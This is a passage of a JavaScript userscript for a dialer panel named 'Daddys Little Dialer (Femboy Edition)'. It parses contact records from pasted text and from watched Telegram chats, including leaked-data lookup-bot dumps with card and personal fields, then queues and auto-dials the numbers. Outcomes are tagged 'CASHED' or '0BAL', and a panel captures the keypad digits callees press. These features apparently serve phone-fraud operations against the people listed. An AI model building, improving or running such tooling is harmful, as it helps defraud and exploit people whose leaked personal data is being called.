            #callbackAlertContent { padding:18px 16px;text-align:center;font-size:14px;line-height:1.5;color:var(--ch-text); }
            #callbackAlertActions { padding:0 16px 16px; }

            /* ---- Incoming alerts ---- */
            #incomingContactAlert { margin:0 16px 8px 16px; }
            #autoQueueConfirm { padding:0 16px;margin-bottom:10px; }
            .confirm-dialog { background:var(--ch-bg);border:1px solid var(--ch-border);border-radius:var(--ch-radius);padding:16px;box-shadow:0 12px 36px var(--ch-shadow-lg);color:var(--ch-text); }
            .confirm-dialog-title { font-size:12px;font-weight:600;letter-spacing:0.04em;text-transform:uppercase;color:var(--ch-text-secondary);margin-bottom:12px; }
            .confirm-dialog-info { font-size:13px;margin-bottom:14px;line-height:1.6; }
            .confirm-dialog-info strong { font-size:15px;display:block;margin-bottom:6px;color:var(--ch-text); }
            .confirm-dialog-info .contact-detail { color:var(--ch-text-secondary);font-size:12px;font-variant-numeric:tabular-nums; }
            .confirm-dialog-btns { display:flex;gap:10px; }
            .confirm-dialog-btns button { flex:1;padding:10px;font-size:12px;font-weight:600; }
            .incoming-contact-alert { background:var(--ch-success);color:#fff;padding:10px 14px;border-radius:var(--ch-radius-sm);font-size:12px; }

            /* ---- Lesbian flag accents ---- */
            #callHelperHeader { background-color:var(--ch-bg-tint);background-image:linear-gradient(90deg,var(--ch-flag-orange) 0 20%,var(--ch-flag-peach) 20% 40%,var(--ch-flag-white) 40% 60%,var(--ch-flag-pink) 60% 80%,var(--ch-flag-deep) 80% 100%);background-repeat:no-repeat;background-position:left bottom;background-size:100% 3px; }
            .btn-warning, #callbackAlertHeader { color:#3B0720; }
            .dispo-btn.clicked { background:var(--ch-success);color:#fff;border-color:var(--ch-success); }
            .key-hint, .stat-cell, .dtmf-log-row { border-color:var(--ch-border); }

            /* ---- Type scale: bumped up from the base rules above ---- */
            #callHelperPanel { font-size:14px; }
            .header-title { font-size:13px; }
            .skid-tag { font-size:10px; }
            .header-btn { font-size:12px; }
            .call-helper-content textarea, .settings-row input[type="text"] { font-size:14px; }
            .helper-button, .control-wrapper .helper-button { font-size:13px; }
            .btn-small { font-size:12px; }
            .helper-info-item, .queue-indicator, .confirm-dialog-info, .inbound-detail { font-size:14px; }
            .helper-info-item strong { font-size:12px; }
            .key-hint, .dispo-btn, .dtmf-status, .inbound-detail strong, .inbound-timer { font-size:11px; }
            .helper-actions label { font-size:13px; }
            .scheduler-row input, .scheduler-row select, .scheduler-row textarea,
            .settings-row span, .settings-row select, #timezone-selector,
            #bulkSessionStatus, #helperSuccessMessage, .incoming-contact-alert,
            .confirm-dialog-title, .confirm-dialog-btns button, #femboyGateLock .lock-body { font-size:13px; }
            .callback-item { font-size:13px; }
            .callback-countdown, .callback-notes-display, .confirm-dialog-info .contact-detail,
            #callbackList h3, #statsView h3, .settings-group-title, .settings-group label,
            .modal-field label, #timezone-selector-container label, .incoming-contact-alert .source,
            .inbound-header-title, .inbound-unknown-label, .dtmf-header > span:first-child,
            .dtmf-log, .dtmf-log-empty, .femboy-gate-note { font-size:12px; }
            .stat-label { font-size:10px; }
            .queue-count { font-size:16px; }
            .stat-number, .inbound-unknown-number { font-size:21px; }
            .inbound-name { font-size:19px; }
            .modal-title, #callbackAlertContent, #femboyGateLock .lock-title { font-size:15px; }
            .modal-field input { font-size:15px; }
            .confirm-dialog-info strong { font-size:16px; }
            .femboy-gate-question { font-size:20px; }
            .dtmf-digits { font-size:26px; }

            /* ---- Femboy gate ---- */
            .femboy-gate { border-top:3px solid var(--ch-flag-orange); }
            .femboy-gate-question { font-size:19px;font-weight:700;color:var(--ch-text);margin-bottom:6px;line-height:1.35; }
            .femboy-gate-note { font-size:11px;color:var(--ch-text-secondary);margin-top:12px;letter-spacing:0.04em; }
            .femboy-gate-flag { display:flex;height:6px;border-radius:3px;overflow:hidden;margin-bottom:16px; }
            .femboy-gate-flag i { flex:1; }
            #femboyGateLock { padding:22px 18px;text-align:center; }
            #femboyGateLock .lock-flag { display:flex;height:8px;border-radius:4px;overflow:hidden;margin-bottom:16px; }
            #femboyGateLock .lock-flag i { flex:1; }
            #femboyGateLock .lock-title { font-size:14px;font-weight:700;color:var(--ch-danger);margin-bottom:10px; }
            #femboyGateLock .lock-body { font-size:12px;line-height:1.6;color:var(--ch-text-secondary); }
            .helper-button:disabled, button:disabled { opacity:0.4;cursor:not-allowed; }


            /* ---- Inbound caller ID popup ---- */
            #inboundCallerPopup { position:fixed;top:20px;left:50%;transform:translateX(-50%);z-index:10002;width:380px;background:var(--ch-bg);border:1px solid var(--ch-border);border-radius:var(--ch-radius);box-shadow:0 24px 64px var(--ch-shadow-lg);font-family:var(--ch-font);overflow:hidden;animation:inboundSlideIn 0.3s ease-out; }
            @keyframes inboundSlideIn { from{opacity:0;transform:translateX(-50%) translateY(-20px)}to{opacity:1;transform:translateX(-50%) translateY(0)} }
            #inboundCallerPopup.fade-out { animation:inboundFadeOut 0.25s ease-in forwards; }
            @keyframes inboundFadeOut { to{opacity:0;transform:translateX(-50%) translateY(-20px)} }
            .inbound-header { display:flex;align-items:center;justify-content:space-between;padding:12px 16px;background:var(--ch-success);color:#fff; }
            .inbound-header-title { font-weight:600;font-size:11px;letter-spacing:var(--ch-track);text-transform:uppercase;display:flex;align-items:center;gap:8px; }
            .inbound-close { background:rgba(255,255,255,0.18);border:none;color:#fff;width:24px;height:24px;border-radius:var(--ch-radius-sm);cursor:pointer;font-size:16px;line-height:1;transition:background 0.12s ease; }
            .inbound-close:hover { background:rgba(255,255,255,0.32); }
            .inbound-body { padding:16px; }
            .inbound-name { font-size:18px;font-weight:700;color:var(--ch-text);margin-bottom:12px;letter-spacing:-0.01em; }
            .inbound-detail { display:flex;margin-bottom:6px;font-size:13px;line-height:1.4;color:var(--ch-text); }
            .inbound-detail strong { flex-shrink:0;width:64px;color:var(--ch-text-secondary);font-weight:500;font-size:10px;letter-spacing:0.06em;text-transform:uppercase;padding-top:3px; }
            .inbound-unknown { padding:18px;text-align:center; }
            .inbound-unknown-number { font-size:20px;font-weight:700;color:var(--ch-text);margin-bottom:4px;font-variant-numeric:tabular-nums;letter-spacing:-0.01em; }
            .inbound-unknown-label { font-size:11px;color:var(--ch-text-muted);letter-spacing:0.04em; }
            .inbound-timer { font-size:10px;color:var(--ch-text-muted);text-align:right;padding:0 16px 12px;font-variant-numeric:tabular-nums; }

            /* ---- DTMF DETECTION ---- */
            #dtmfView { padding:14px 16px;border-top:1px solid var(--ch-border); }
            .dtmf-header { display:flex;align-items:center;justify-content:space-between;margin-bottom:10px; }
            .dtmf-header > span:first-child { font-size:11px;font-weight:600;letter-spacing:var(--ch-track);text-transform:uppercase;color:var(--ch-text-secondary); }
            .dtmf-controls { display:flex;align-items:center;gap:10px; }
            .dtmf-status { font-size:10px;font-weight:600;letter-spacing:0.06em;text-transform:uppercase;color:var(--ch-text-muted); }
            .dtmf-status.live { color:var(--ch-success); }
            .dtmf-status.live::before { content:'';display:inline-block;width:6px;height:6px;border-radius:50%;background:var(--ch-success);margin-right:5px;vertical-align:middle; }
            .dtmf-status.off { color:var(--ch-text-muted); }
            .dtmf-digits { font-family:var(--ch-mono);font-size:24px;font-weight:700;letter-spacing:4px;min-height:32px;color:var(--ch-text);word-break:break-all;padding:8px 0;font-variant-numeric:tabular-nums;line-height:1.2; }
            .dtmf-log { max-height:90px;overflow-y:auto;font-size:11px;color:var(--ch-text-secondary);border-top:1px solid var(--ch-border-light);margin-top:4px; }
            .dtmf-log-row { display:flex;justify-content:space-between;padding:4px 0;border-bottom:1px solid var(--ch-border-light); }
            .dtmf-log-row:last-child { border-bottom:none; }
            .dtmf-log-key { font-weight:700;color:var(--ch-text);font-family:var(--ch-mono); }
            .dtmf-log-row span:last-child { font-variant-numeric:tabular-nums;color:var(--ch-text-muted); }
            .dtmf-log-empty { color:var(--ch-text-muted);font-style:italic;padding:6px 0;font-size:11px; }
        `);

        // HTML
        const helperPanel = document.createElement('div');
        helperPanel.id = 'callHelperPanel';
        if (settings.darkMode) helperPanel.classList.add('dark-mode');

        helperPanel.innerHTML = `
            <div id="callHelperHeader">
                <span class="header-title">Daddys Little Dialer <span class="skid-tag">(Femboy Edition)</span><span class="telegram-status" id="telegramStatus" title="Telegram"></span></span>
                <div class="header-controls">
                    <button class="header-btn" id="settingsBtn" title="Settings">Settings</button>
                    <button class="header-btn" id="darkModeBtn" title="Toggle theme">${settings.darkMode ? 'Light' : 'Dark'}</button>
                    <button class="header-btn" id="minimizeBtn" title="Minimize">&minus;</button>
                </div>
            </div>
            <div id="autoQueueConfirm" style="display:none;"></div>
            <div id="incomingContactAlert" style="display:none;"></div>
            <div class="call-helper-content">
                <div id="normalView">
                    <div class="queue-indicator" id="queueIndicator" style="display:none;"><span>Queued:</span><span class="queue-count" id="queueCount">0</span></div>
                    <textarea id="helperDataInput" placeholder="Paste contact or list..."></textarea>
                    <button id="helperProcessBtn" class="helper-button btn-success">Process Single</button>
                    <button id="startBulkSessionBtn" class="helper-button btn-primary">Start Bulk Session</button>
                    <div id="helperSuccessMessage"></div>
                    <div class="helper-actions">
                        <label><input type="checkbox" id="autoDialCheckbox"> Auto-Dial</label>
                        <button id="toggleStatsBtn" class="helper-button btn-small btn-secondary">Stats</button>
                        <button id="testSoundBtn" class="helper-button btn-small btn-secondary" title="Test sound">Sound</button>
                    </div>
                    <div id="timezone-selector-container"><label>Timezone</label><select id="timezone-selector"></select></div>
                    <div id="helper-contact-info" style="margin-top:8px;"></div>
                    <div class="disposition-controls" id="normal-disposition-controls" style="display:none;">
                        <button class="dispo-btn" data-type="vm">VM</button>
                        <button class="dispo-btn" data-type="gritz">GRITZ</button>
                        <button class="dispo-btn" data-type="cashed">CASHED</button>
                        <button class="dispo-btn" data-type="zerobal">0BAL</button>
                        <button class="dispo-btn" data-type="troll">TROLL</button>
                    </div>
                    <div class="callback-scheduler" id="normal-callback-scheduler">
                        <div class="scheduler-row"><input type="datetime-local" id="callbackTimeInput"><select id="perCallbackTimezoneInput"></select></div>
                        <textarea id="callbackNotesInput" class="callback-notes" placeholder="Notes..."></textarea>
                        <button id="scheduleCallbackBtn" class="helper-button btn-warning">Schedule Callback</button>
                    </div>
                </div>
                <div id="bulkSessionView">
                    <div id="bulkSessionStatus"></div>
                    <div id="bulk-contact-info"></div>
                    <div class="disposition-controls" id="bulk-disposition-controls">
                        <button class="dispo-btn" data-type="vm">VM</button>
                        <button class="dispo-btn" data-type="gritz">GRITZ</button>
                        <button class="dispo-btn" data-type="cashed">CASHED</button>
                        <button class="dispo-btn" data-type="zerobal">0BAL</button>
                        <button class="dispo-btn" data-type="troll">TROLL</button>
                    </div>
                    <div class="bulk-session-controls">
                        <div class="control-wrapper"><button id="redialBtn" class="helper-button btn-secondary">Redial</button><span class="key-hint" id="redialHint">${settings.keybinds.redial}</span></div>
                        <div class="control-wrapper"><button id="callNextBtn" class="helper-button btn-primary">Next</button><span class="key-hint" id="callNextHint">${settings.keybinds.callNext}</span></div>
                        <div class="control-wrapper"><button id="hangupBtn" class="helper-button btn-danger">Hangup</button><span class="key-hint" id="hangupHint">${settings.keybinds.hangup}</span></div>
                    </div>
                    <button id="endBulkSessionBtn" class="helper-button btn-secondary" style="margin-top:6px;">End Session</button>
                    <div class="callback-scheduler">
                        <div class="scheduler-row"><input type="datetime-local" id="bulkCallbackTimeInput"><select id="bulkPerCallbackTimezoneInput"></select></div>
                        <textarea id="bulkCallbackNotesInput" class="callback-notes" placeholder="Notes..."></textarea>
                        <button id="bulkScheduleCallbackBtn" class="helper-button btn-warning">Schedule</button>
                    </div>
                </div>
            </div>
            <div id="settingsPanel">
                <div class="settings-group">
                    <div class="settings-group-title">Keybinds</div>
                    <div class="settings-row"><span>Redial:</span><input type="text" class="key-input" id="keybindRedial" maxlength="1" value="${settings.keybinds.redial}"></div>
                    <div class="settings-row"><span>Next:</span><input type="text" class="key-input" id="keybindCallNext" maxlength="1" value="${settings.keybinds.callNext}"></div>
                    <div class="settings-row"><span>Hangup:</span><input type="text" class="key-input" id="keybindHangup" maxlength="1" value="${settings.keybinds.hangup}"></div>
                </div>

                <div class="settings-group">
                    <div class="settings-group-title">Auto-Queue (Watched Chats)</div>
                    <div class="toggle-row">
                        <span>Auto-add to bulk queue</span>
                        <div class="toggle-switch ${settings.autoQueueEnabled ? 'active' : ''}" id="autoQueueToggle"></div>
                    </div>
                    <div class="settings-row" style="margin-top:6px;">
                        <span>Mode:</span>
                        <select id="autoQueueModeSelect">
                            <option value="auto" ${settings.autoQueueMode === 'auto' ? 'selected' : ''}>Auto (silent)</option>
                            <option value="prompt" ${settings.autoQueueMode === 'prompt' ? 'selected' : ''}>Prompt each</option>
                        </select>
                    </div>
                </div>

                <button id="saveSettingsBtn" class="helper-button btn-primary">Save All Settings</button>
            </div>
            <div id="callbackList"><h3>Callbacks</h3><div id="callbacksContainer"></div></div>
            <div id="statsView" style="display:none;"><h3>Stats</h3><div id="statsContent"></div><button id="resetStatsBtn" class="helper-button btn-secondary btn-small" style="margin-top:6px;">Reset</button></div>
            <div id="dtmfView">
                <div class="dtmf-header">
                    <span>DTMF Detection</span>
                    <div class="dtmf-controls">
                        <span class="dtmf-status" id="dtmfStatus">Idle</span>
                        <div class="toggle-switch ${settings.dtmfEnabled !== false ? 'active' : ''}" id="dtmfToggle" title="Enable DTMF detection"></div>
                        <button id="dtmfClear" class="helper-button btn-small btn-secondary" title="Clear digits">Clear</button>
                    </div>
                </div>
                <div id="dtmfDigits" class="dtmf-digits">Empty</div>
                <div id="dtmfLog" class="dtmf-log"></div>
            </div>
        `;
        document.body.appendChild(helperPanel);

        // Callback alert element
        const alertEl = document.createElement('div');
        alertEl.id = 'callbackAlertPopup';
        alertEl.innerHTML = `<div id="callbackAlertHeader"></div><div id="callbackAlertContent"></div><div id="callbackAlertActions"><button id="dismissCallbackAlertBtn" class="helper-button btn-secondary">Dismiss</button></div>`;
        document.body.appendChild(alertEl);

        // DOM references
        const $ = id => document.getElementById(id);
        const DOM = {
            panel: $('callHelperPanel'), header: $('callHelperHeader'), normalView: $('normalView'), bulkSessionView: $('bulkSessionView'),
            settingsPanel: $('settingsPanel'), telegramStatus: $('telegramStatus'), dataInput: $('helperDataInput'),
            callbackTimeInput: $('callbackTimeInput'), callbackNotesInput: $('callbackNotesInput'),
            bulkCallbackTimeInput: $('bulkCallbackTimeInput'), bulkCallbackNotesInput: $('bulkCallbackNotesInput'),
            perCallbackTimezone: $('perCallbackTimezoneInput'), bulkPerCallbackTimezone: $('bulkPerCallbackTimezoneInput'),
            timezoneSelector: $('timezone-selector'), autoDialCheckbox: $('autoDialCheckbox'),
            processBtn: $('helperProcessBtn'), startBulkSessionBtn: $('startBulkSessionBtn'),
            callNextBtn: $('callNextBtn'), redialBtn: $('redialBtn'), hangupBtn: $('hangupBtn'), endBulkSessionBtn: $('endBulkSessionBtn'),
            scheduleCallbackBtn: $('scheduleCallbackBtn'), bulkScheduleCallbackBtn: $('bulkScheduleCallbackBtn'),
            toggleStatsBtn: $('toggleStatsBtn'), testSoundBtn: $('testSoundBtn'), resetStatsBtn: $('resetStatsBtn'),
            settingsBtn: $('settingsBtn'), darkModeBtn: $('darkModeBtn'), minimizeBtn: $('minimizeBtn'),
            saveSettingsBtn: $('saveSettingsBtn'),
            keybindRedial: $('keybindRedial'), keybindCallNext: $('keybindCallNext'), keybindHangup: $('keybindHangup'),
            contactInfoDiv: $('helper-contact-info'), bulkContactInfoDiv: $('bulk-contact-info'),
            successMessageDiv: $('helperSuccessMessage'), bulkSessionStatus: $('bulkSessionStatus'),
            callbacksContainer: $('callbacksContainer'), statsContent: $('statsContent'), statsView: $('statsView'),
            dispositionNormal: $('normal-disposition-controls'), dispositionBulk: $('bulk-disposition-controls'),
            redialHint: $('redialHint'), callNextHint: $('callNextHint'), hangupHint: $('hangupHint'),
            queueIndicator: $('queueIndicator'), queueCount: $('queueCount'), incomingContactAlert: $('incomingContactAlert'),
            autoQueueConfirm: $('autoQueueConfirm'),
            callbackAlertPopup: $('callbackAlertPopup'), dismissCallbackAlertBtn: $('dismissCallbackAlertBtn'),
            autoQueueToggle: $('autoQueueToggle'), autoQueueModeSelect: $('autoQueueModeSelect'),
            dtmfView: $('dtmfView'), dtmfDigits: $('dtmfDigits'), dtmfLog: $('dtmfLog'),
            dtmfStatus: $('dtmfStatus'), dtmfToggle: $('dtmfToggle'), dtmfClear: $('dtmfClear')
        };

        // State
        let currentContact = null, lastProcessedNumber = null, bulkQueue = [], currentBulkIndex = -1, incomingQueue = [];
        let callbacks = getShared('callbacks', []);
        let sessionStats = getShared('sessionStats', {total:0,vm:0,gritz:0,cashed:0,zerobal:0,troll:0});
        let callHistory = getShared('gvCallHistory_v2', {});
        let alertTimerInterval = null;

        // Functions
        function showMessage(msg, duration = 2500) {
            DOM.successMessageDiv.textContent = msg;
            if (duration > 0) setTimeout(() => { if (DOM.successMessageDiv.textContent === msg) DOM.successMessageDiv.textContent = ''; }, duration);
        }
        function flashButton(btn) { if (!btn) return; btn.classList.add('btn-flash'); setTimeout(() => btn.classList.remove('btn-flash'), 200); }
        function updateTelegramStatus() { DOM.telegramStatus.classList.toggle('connected', telegramConnected); }
        function getTimezoneOffset(tz, date = new Date()) {
            const utc = new Date(date.toLocaleString('en-US', { timeZone: 'UTC' }));
            const tzd = new Date(date.toLocaleString('en-US', { timeZone: tz }));
            return utc.getTime() - tzd.getTime();
        }

        // Batch incoming contacts
        let pendingContacts = [];
        let batchTimeout = null;

        function handleIncomingContact(data, source) {
            console.log('[Call Helper] handleIncomingContact called');
            console.log('[Call Helper] RAW DATA:', data);
            console.log('[Call Helper] Data length:', data.length);

            // Split the data into individual contacts
            const contacts = parseMultipleContacts(data);
            console.log('[Call Helper] Parsed', contacts.length, 'contacts from message');
            if (contacts.length > 0) {
                console.log('[Call Helper] First contact:', JSON.stringify(contacts[0]));
            }

            if (contacts.length === 0) {
                console.log('[Call Helper] No valid contacts found');
                return;
            }

            // Add all to pending batch
            contacts.forEach(contact => {
                pendingContacts.push({ contact, source, data });
            });

            // Clear existing timeout and set new one
            if (batchTimeout) clearTimeout(batchTimeout);

            // Wait 500ms for more contacts before processing
            batchTimeout = setTimeout(() => {
                processBatchedContacts();
            }, 500);
        }

        // Parse a message that may contain multiple contacts in various formats
        function parseMultipleContacts(text) {
            const contacts = [];

            // NORMALIZE: Clean up the text
            text = text.replace(/\r\n/g, '\n').replace(/\r/g, '\n');

            // DETECT FORMAT and split into records
            let records = [];

            // FORMAT: Telegram export with timestamps - "Username, [date time]" headers
            // Split by these headers
            if (/\[\d{1,2}\/\d{1,2}\/\d{2,4}.*?\]/.test(text)) {
                // Split by timestamp headers, keep content after each
                const chunks = text.split(/[^\n]+,\s*\[\d{1,2}\/\d{1,2}\/\d{2,4}[^\]]*\]\s*/);
                for (const chunk of chunks) {
                    if (chunk.trim() && (chunk.includes('@') || /\d{10}/.test(chunk))) {
                        records.push(chunk.trim());
                    }
                }
            }
            // FORMAT: Lurk bot - split by checkmark emoji and use whole chunks.
            // NOTE: use \u2705 instead of the literal emoji in the regex. A literal
            // emoji here can be corrupted into '?' during copy/paste into some
            // editors, turning /(?=?)/ into /(?=?)/ which throws "Nothing to repeat".
            else if (text.includes('\u2705') && (text.includes('Raw Line') || text.includes('Phone Number'))) {
                const chunks = text.split(/(?=\u2705)/).filter(c => c.trim() && (c.includes('@') || /\d{10}/.test(c)));
                records = chunks;
            }
            // FORMAT: Multiple "Name:" blocks
            else if ((text.match(/Name:/gi) || []).length > 1) {
                const chunks = text.split(/(?=Name:)/i).filter(c => c.trim());
                records = chunks;
            }
            // FORMAT: Multiple emails = multiple contacts
            else {
                const emails = text.match(/[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}/g) || [];
                const unique = [...new Set(emails.map(e => e.toLowerCase()))];

                if (unique.length <= 1) {
                    records = [text];
                } else {
                    // Split by email occurrence
                    let remaining = text;
                    for (let i = 0; i < unique.length; i++) {
                        const email = unique[i];
                        const idx = remaining.toLowerCase().indexOf(email);
                        if (idx === -1) continue;

                        // Find where next contact starts (next email or end)
                        let endIdx = remaining.length;
                        if (i + 1 < unique.length) {
                            const nextIdx = remaining.toLowerCase().indexOf(unique[i + 1], idx + email.length);
                            if (nextIdx > idx) {
                                // Go back to start of line containing next email
                                const lineStart = remaining.lastIndexOf('\n', nextIdx);
                                endIdx = lineStart > idx ? lineStart : nextIdx;
                            }
                        }

                        const chunk = remaining.substring(0, endIdx).trim();
                        if (chunk) records.push(chunk);
                        remaining = remaining.substring(endIdx);
                    }
                    if (remaining.trim()) records.push(remaining.trim());
                }
            }

            console.log('[Call Helper] Split into', records.length, 'records');

            // Parse each record
            for (const record of records) {
                const contact = parseContactRecord(record);
                if (contact && (contact.phones.length > 0 || contact.email !== 'N/A')) {
                    // Dedupe
                    const isDupe = contacts.some(c =>
                        (c.email !== 'N/A' && contact.email !== 'N/A' && c.email.toLowerCase() === contact.email.toLowerCase()) ||
                        (c.phones[0] && contact.phones[0] && c.phones[0] === contact.phones[0])
                    );
                    if (!isDupe) contacts.push(contact);
                }
            }

            console.log('[Call Helper] Parsed', contacts.length, 'unique contacts');
            return contacts;
        }

        // Normalize a raw phone string into either a 10-digit US number or a full
        // international number prefixed with '+' (country code included). GV needs
        // the '+' prefix to place international calls.
        //   - US: 10 digits (area code starts 2-9), or 11 starting with '1' -> strip to 10
        //   - International: anything else with a country code -> keep full digits, prepend '+'
        // Returns null if the input isn't a recognisable phone number.
        function normalizePhone(raw) {
            if (!raw) return null;
            const digits = raw.replace(/\D/g, '');
            if (!digits) return null;

            // US/Canada: 10 digits (NANP), area code [2-9]XXXX
            if (digits.length === 10 && /^[2-9]/.test(digits)) return digits;
            // 11 digits starting with 1 (US long-distance prefix) -> strip the 1
            if (digits.length === 11 && digits.startsWith('1') && /^[2-9]/.test(digits.slice(1))) return digits.slice(1);

            // International: 7-15 digits (ITU-T E.164 range) with a country code.
            // Keep the full number and prefix with '+' so GV dials it internationally.
            // (We require >= 7 so we don't grab short numeric fragments as "phones".)
            if (digits.length >= 7 && digits.length <= 15) return '+' + digits;

            return null;
        }

        // Stable lookup key for a stored phone number. US numbers (stored as 10
        // bare digits) key on those 10 digits. International numbers (stored as
        // '+CC...') key on the full digit string including country code. This keeps
        // the history/lookup consistent regardless of format.
        function phoneKey(phone) {
            if (!phone) return '';
            const digits = phone.replace(/\D/g, '');
            // International (stored with +): use all digits as the key
            if (phone.startsWith('+')) return digits;
            // US: use last 10 (in case a stray 1 snuck in)
            return digits.slice(-10);
        }

        // BULLETPROOF PARSER - handles any format
        function parseContactRecord(text) {
            let email = 'N/A', name = 'N/A', phones = [], address = null;

            // Remove timestamp headers
            text = text.replace(/[^\n]+,\s*\[\d{1,2}\/\d{1,2}\/\d{2,4}[^\]]*\]/g, '');

            // SPECIAL: Lurk bot format - extract Raw Line (can be CSV or PIPE separated)
            const rawLineMatch = text.match(/Raw Line[:\s]+([^\n]+)/i);
            if (rawLineMatch) {
                const rawLine = rawLineMatch[1].trim();

                // Detect separator: pipe or comma
                const hasPipes = rawLine.includes('|');
                const separator = hasPipes ? '|' : ',';
                const parts = rawLine.split(separator).map(p => p.trim());

                console.log('[Parser] Raw Line detected, separator:', separator, 'parts:', parts.length);

                for (const part of parts) {
                    // Email
                    if (email === 'N/A' && /@/.test(part)) {
                        const m = part.match(/[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}/);
                        if (m) email = m[0].toLowerCase();
                    }
                    // Phone (7+ digits -- covers US and international)
                    else if (phones.length === 0 && /\d{7,}/.test(part)) {
                        const norm = normalizePhone(part);
                        if (norm) phones.push(norm);
                    }
                    // Name (letters, spaces, common name chars, not location/card info)
                    else if (name === 'N/A' && /^[A-Za-z][A-Za-z\s.''-]{1,50}$/.test(part)) {
                        const notName = /^(Card|CD|CA|US|BC|ON|AB|Unknown|White|Black|Asian|Middle|Caucasian|Hispanic)/i.test(part) ||
                                       /,/.test(part) || // Has comma = location
                                       part.length < 3;
                        if (!notName) name = part;
                    }
                }

                console.log('[Parser] Raw Line result:', { name, email, phones });

                // If we got data from Raw Line, clean up and return
                if (email !== 'N/A' || phones.length > 0) {
                    if (name !== 'N/A') {
                        name = name.replace(/\s+/g, ' ').trim();
                        if (name === name.toUpperCase()) {
                            name = name.split(' ').map(w => w.charAt(0) + w.slice(1).toLowerCase()).join(' ');
                        }
                    }
                    return { name, email, phones, address, crypto: [] };
                }
            }

            // EXTRACT EMAIL (most reliable anchor)
            const emailMatch = text.match(/[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}/i);
            if (emailMatch) email = emailMatch[0].toLowerCase();

            // EXTRACT PHONE - multiple patterns. Ordered: labelled first, then
            // international (with + prefix), then US 10-digit formats. Each match
            // is routed through normalizePhone() which handles US vs international.
            const phonePatterns = [
                // Labelled: "Phone Number: +1234567890" or "Phone: (123) 456-7890"
                /Phone(?:\s*Number)?[:\s]*([+\d][\d\s().-]{6,})/i,
                // International with explicit + and country code: +44 20 7946 0958, +33 1 42 86 82 00
                /\+(\d[\d\s().-]{6,}\d)/,
                // +1 followed by 10 US digits
                /\+1[\s.-]?(\d{3})[\s.-]?(\d{3})[\s.-]?(\d{4})/,
                // US grouped: (123) 456-7890, 123-456-7890, 123.456.7890
                /\(?(\d{3})\)?[-.\s]?(\d{3})[-.\s]?(\d{4})/,
                // Bare 10 or 11 digits
                /\b1?(\d{10})\b/
            ];

            for (const pattern of phonePatterns) {
                const match = text.match(pattern);
                if (!match) continue;
                // Reconstruct the matched phone text (may include +, spaces, dashes)
                let raw;
                if (match[3]) raw = match[1] + match[2] + match[3];            // grouped
                else if (match[1]) raw = match[1];                              // single group
                else raw = match[0];                                            // full match (labelled/intl)
                const norm = normalizePhone(raw);
                if (norm) { phones.push(norm); break; }
            }

            // EXTRACT NAME - multiple strategies
            // Strategy 1: Labeled "Name: X"
            const nameMatch = text.match(/Name[:\s]+([A-Za-z][A-Za-z\s.''-]{2,50}?)(?:\n|$|Email|Phone|Address)/i);
            if (nameMatch) {
                name = nameMatch[1].trim();
            }
            // Strategy 2: ALL CAPS name (common in contact lists)
            if (name === 'N/A') {
                const capsMatch = text.match(/\b([A-Z][A-Z]+(?:\s+[A-Z][A-Z]+)+)\b/);
                if (capsMatch && capsMatch[1].length > 4 && capsMatch[1].length < 50) {
                    const notName = /^(RAW LINE|PHONE NUMBER|PO BOX|CREDIT CARD)/i.test(capsMatch[1]);
                    if (!notName) name = capsMatch[1];
                }
            }
            // Strategy 3: Pipe-separated format
            if (name === 'N/A' && text.includes('|')) {
                const parts = text.split('|').map(p => p.trim());
                for (const part of parts) {
                    if (/^[A-Za-z][A-Za-z\s.''-]{2,40}$/.test(part)) {
                        const notName = /^(Card|CD|CA|US|BC|ON|AB|Unknown)/i.test(part) || part.includes(',');
                        if (!notName) { name = part; break; }
                    }
                }
            }
            // Strategy 4: CSV format - name is usually last field after email/phone
            if (name === 'N/A' && text.includes(',')) {
                const parts = text.split(',').map(p => p.trim().replace(/^["']|["']$/g, ''));
                // Try from end (name often last)
                for (let i = parts.length - 1; i >= 0; i--) {
                    const part = parts[i];
                    if (/^[A-Za-z][A-Za-z\s.''-]{2,40}$/.test(part) && !/@/.test(part) && !/\d{5,}/.test(part)) {
                        name = part;
                        break;
                    }
                }
            }

            // EXTRACT from PIPE format if we still need data
            if (text.includes('|') && (phones.length === 0 || email === 'N/A')) {
                const parts = text.split('|').map(p => p.trim());
                for (const part of parts) {
                    if (email === 'N/A' && /@/.test(part)) {
                        const m = part.match(/[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}/);
                        if (m) email = m[0].toLowerCase();
                    }
                    if (phones.length === 0) {
                        const norm = normalizePhone(part);
                        if (norm) phones.push(norm);
                    }
                }
            }

            // ADDRESS extraction
            const addrMatch = text.match(/\b([A-Za-z\s]+),\s*([A-Z]{2})\s*(\d{5})?\b/);
            if (addrMatch) address = addrMatch[0];

            // Clean up name
            if (name !== 'N/A') {
                name = name.replace(/\s+/g, ' ').trim();
                // Title case if all caps
                if (name === name.toUpperCase()) {
                    name = name.split(' ').map(w => w.charAt(0) + w.slice(1).toLowerCase()).join(' ');
                }
            }

            return { name, email, phones, address, crypto: [] };
        }

        function processBatchedContacts() {
            if (pendingContacts.length === 0) return;

            const batch = [...pendingContacts];
            pendingContacts = [];
            batchTimeout = null;

            const source = batch[0].source;
            console.log('[Call Helper] Processing batch of', batch.length, 'contacts from', source);

            if (settings.autoQueueEnabled) {
                if (settings.autoQueueMode === 'auto') {
                    // Auto-add all silently
                    batch.forEach(({ contact }) => addToQueue(contact, source, true));
                    showMessage(`+${batch.length} added from ${source}`);
                } else {
                    // Prompt user - show simplified if multiple
                    showAutoQueueConfirm(batch, source);
                }
            } else {
                // Old behavior - add to incoming queue
                batch.forEach(({ contact }) => {
                    incomingQueue.push({ contact, source });
                });
                updateQueueIndicator();
                showIncomingAlert(batch.length, source);
            }
        }

        function showIncomingAlert(count, source) {
            DOM.incomingContactAlert.className = 'incoming-contact-alert';
            DOM.incomingContactAlert.style.display = 'block';
            if (count === 1) {
                DOM.incomingContactAlert.innerHTML = `1 contact from <strong>${source}</strong>`;
            } else {
                DOM.incomingContactAlert.innerHTML = `${count} contacts from <strong>${source}</strong>`;
            }
            setTimeout(() => { DOM.incomingContactAlert.style.display = 'none'; }, 4000);
        }

        function showAutoQueueConfirm(batch, source) {
            console.log('[Call Helper] Showing auto-queue confirm dialog for', batch.length, 'contacts');

            if (window.autoQueueConfirmTimeout) {
                clearTimeout(window.autoQueueConfirmTimeout);
            }

